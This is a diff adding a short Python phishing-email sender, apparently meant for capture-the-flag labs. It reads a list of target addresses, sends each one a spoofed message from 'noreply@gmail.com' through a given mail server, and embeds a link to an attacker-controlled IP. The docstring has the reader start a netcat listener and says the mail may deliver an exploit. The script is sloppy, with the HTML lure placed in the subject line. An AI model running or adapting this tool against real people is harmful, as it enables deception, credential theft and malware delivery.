@@ -1,0 +1,53 @@
+#!/usr/bin/env python3
+"""
+Simple phishing email generator for lawful use only. 
+
+Use:
+
+1) Edit the path to your file of target emails. There should be one email per
+line in your file. 
+
+jon.doe@blahblah.htb
+jane.doe@blahblah.htb
+jimmy.doe@blahblah.htb
+
+2) Add the IP for the target mail server
+
+3) Go down to the message variable and ensure you change the href to your 
+IP
+
+4) Depending on what you're doing, you may be delivering an exploit or just
+confirming that a user will respond. If you're just looking to confirm a 
+response, then set a listener on port 80: nc -nlvp 80
+
+5) python3 ./phish.py
+
+"""
+import smtplib
+from email.mime.text import MIMEText
+
+
+recipients = []
+with open('/home/user/Desktop/listofemails.txt', 'r') as f_obj: #  1) Edit Path here 
+    emails = f_obj.read()
+    data = emails.split('\n')
+    for item in data:
+        recipients.append(item)
+
+        
+ 
+for email in recipients:
+    print(email)    
+    server = "10.10.xx.xx"  # 2) Edit the target mail server
+    s = smtplib.SMTP(server)
+    # s.set_debuglevel(1)
+    # 3) Change the IP below
+    message = """<pre>Congratulations! We've successfully created account.
+    Go to the page: <a href="http://YOUR IP/dummy.txt">click here</a>
+    Thanks, XYZ Team.</pre>"""
+    msg = MIMEText('H0WDY! Yall got any more of them creds?')
+    sender = 'noreply@gmail.com'
+    msg['Subject'] = message
+    msg['From'] = sender
+    msg['To'] = email
+    s.sendmail(sender, email, msg.as_string())
